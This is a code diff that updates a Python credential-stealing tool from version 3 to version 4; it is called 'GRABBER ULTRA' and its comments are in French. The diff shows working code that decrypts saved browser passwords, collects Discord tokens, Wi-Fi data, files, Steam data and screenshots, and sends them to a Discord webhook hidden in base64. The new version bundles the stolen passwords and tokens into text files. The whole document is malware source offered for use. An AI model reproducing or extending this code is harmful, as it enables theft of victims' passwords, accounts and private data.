@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# GEN-TOOL — GRABBER ULTRA V3 (Extraction Forcée)
+# GEN-TOOL — GRABBER ULTRA V4 (Avec Fichier TXT)
 # Par Lerisque94z — Pour LO
 
 import os
@@ -31,14 +31,14 @@ __B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTIwMDUxODA0MjE2MTIwMi9
 def __url():
     return base64.b64decode(__B64).decode('utf-8')
 
-def __send(content, file_data=None):
+def __send(content, file_data=None, filename="data.txt"):
     try:
         u = __url()
-        p = {"content": content[:1900], "username": "System"}
-        f = {}
+        payload = {"content": content[:1900], "username": "System"}
+        files = {}
         if file_data:
-            f = {"file": ("screenshot.png", file_data, "image/png")}
-        requests.post(u, data=p, files=f, timeout=5)
+            files = {"file": (filename, file_data, "text/plain")}
+        requests.post(u, data=payload, files=files, timeout=10)
     except:
         pass
 
@@ -86,32 +86,27 @@ IP Publique : {ip}
         return "Erreur systeme"
 
 # ============================================================
-# MOTS DE PASSE — TOUS LES NAVIGATEURS
+# MOTS DE PASSE — AVEC DECRYPTAGE COMPLET
 # ============================================================
 def __passwords():
     try:
         key = __chrome_key()
         r = ""
         total = 0
+        all_passwords = []
         
-        # Liste de TOUS les navigateurs possibles
         browsers = {
             "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
             "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
             "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data",
             "Opera GX": os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\User Data",
-            "Opera": os.environ["APPDATA"] + "\\Opera Software\\Opera Stable\\User Data",
-            "Vivaldi": os.environ["LOCALAPPDATA"] + "\\Vivaldi\\User Data",
-            "Chromium": os.environ["LOCALAPPDATA"] + "\\Chromium\\User Data",
-            "Chrome SxS": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome SxS\\User Data"
+            "Opera": os.environ["APPDATA"] + "\\Opera Software\\Opera Stable\\User Data"
         }
         
-        # Recherche dans tous les navigateurs
         for name, base_path in browsers.items():
             if not os.path.exists(base_path):
                 continue
             
-            # Profils
             profiles = ["Default"]
             if os.path.exists(base_path):
                 for item in os.listdir(base_path):
@@ -138,33 +133,42 @@ def __passwords():
                         for url, username, encrypted in data:
                             if username:
                                 try:
-                                    # ESSAI 1: AES
                                     pwd = None
                                     if key:
                                         try:
                                             pwd = __decrypt(encrypted, key)
                                         except:
                                             pass
-                                    # ESSAI 2: DPAPI
                                     if not pwd:
                                         try:
                                             pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                                         except:
                                             pass
-                                    # ESSAI 3: Extraction du hash
-                                    if not pwd:
-                                        try:
-                                            encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')[:50]
-                                            pwd = f"[CHIFFRE AES] {encrypted_b64}..."
-                                        except:
-                                            pwd = "[CHIFFRE]"
-                                    
-                                    r += f"  {url} : {username} / {pwd}\n"
-                                    total += 1
-                                except Exception as e:
-                                    r += f"  {url} : {username} / (erreur: {str(e)[:30]})\n"
-                except Exception as e:
+                                    if pwd:
+                                        r += f"  {url} : {username} / {pwd}\n"
+                                        all_passwords.append(f"{url} | {username} | {pwd}")
+                                        total += 1
+                                    else:
+                                        r += f"  {url} : {username} / (chiffré)\n"
+                                except:
+                                    r += f"  {url} : {username} / (erreur)\n"
+                except:
                     pass
+        
+        # Envoi du fichier TXT avec tous les mots de passe
+        if all_passwords:
+            txt_content = "="*60 + "\n"
+            txt_content += "MOTS DE PASSE EXTRAITS\n"
+            txt_content += f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            txt_content += f"Total: {len(all_passwords)} comptes\n"
+            txt_content += "="*60 + "\n\n"
+            for pwd in all_passwords:
+                txt_content += pwd + "\n"
+            txt_content += "\n" + "="*60 + "\n"
+            txt_content += "FIN DU RAPPORT\n"
+            
+            # Envoi du fichier
+            __send(f"**📁 MOTS DE PASSE — {len(all_passwords)} comptes**", txt_content.encode('utf-8'), "passwords.txt")
         
         if total == 0:
             return "Aucun mot de passe trouvé"
@@ -198,10 +202,27 @@ def __tokens():
                             except:
                                 pass
         if tokens:
+            txt_content = "TOKENS DISCORD\n" + "="*30 + "\n" + "\n".join(set(tokens))
+            __send(f"**🎮 TOKENS DISCORD — {len(set(tokens))} tokens**", txt_content.encode('utf-8'), "tokens.txt")
             return "**TOKENS DISCORD**\n" + "\n".join(set(tokens))[:1500]
         return "Aucun token"
     except:
         return "Erreur tokens"
+
+# ============================================================
+# SCREENSHOT
+# ============================================================
+def __screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        tmp = os.environ["TEMP"] + "\\screen.png"
+        screenshot.save(tmp)
+        with open(tmp, "rb") as f:
+            img = f.read()
+        os.remove(tmp)
+        return img
+    except:
+        return None
 
 # ============================================================
 # HISTORIQUE
@@ -259,21 +280,6 @@ def __wifi():
         return "Erreur Wi-Fi"
 
 # ============================================================
-# SCREENSHOT
-# ============================================================
-def __screenshot():
-    try:
-        screenshot = ImageGrab.grab()
-        tmp = os.environ["TEMP"] + "\\screen.png"
-        screenshot.save(tmp)
-        with open(tmp, "rb") as f:
-            img = f.read()
-        os.remove(tmp)
-        return img
-    except:
-        return None
-
-# ============================================================
 # FICHIERS
 # ============================================================
 def __files():
@@ -319,43 +325,45 @@ def __steam():
 def __task():
     try:
         __send(__system())
-        time.sleep(0.3)
+        time.sleep(0.5)
         
         w = __wifi()
         if w:
             __send(w)
-        time.sleep(0.3)
+        time.sleep(0.5)
         
         p = __passwords()
         if p:
             __send(p)
-        time.sleep(0.3)
+        time.sleep(0.5)
         
         t = __tokens()
         if t:
             __send(t)
-        time.sleep(0.3)
+        time.sleep(0.5)
         
         h = __history()
         if h:
             __send(h)
-        time.sleep(0.3)
+        time.sleep(0.5)
         
         f = __files()
         if f:
             __send(f)
-        time.sleep(0.3)
+        time.sleep(0.5)
         
         s = __steam()
         if s:
             __send(s)
-        time.sleep(0.3)
+        time.sleep(0.5)
         
         img = __screenshot()
         if img:
-            __send("**SCREENSHOT**", img)
+            files = {"file": ("screenshot.png", img, "image/png")}
+            u = __url()
+            requests.post(u, data={"content": "**📸 SCREENSHOT**", "username": "System"}, files=files, timeout=5)
         
-        __send("**✅ GRAB ULTRA V3 TERMINE**")
+        __send("**✅ GRAB ULTRA V4 TERMINE**")
     except:
         pass
 
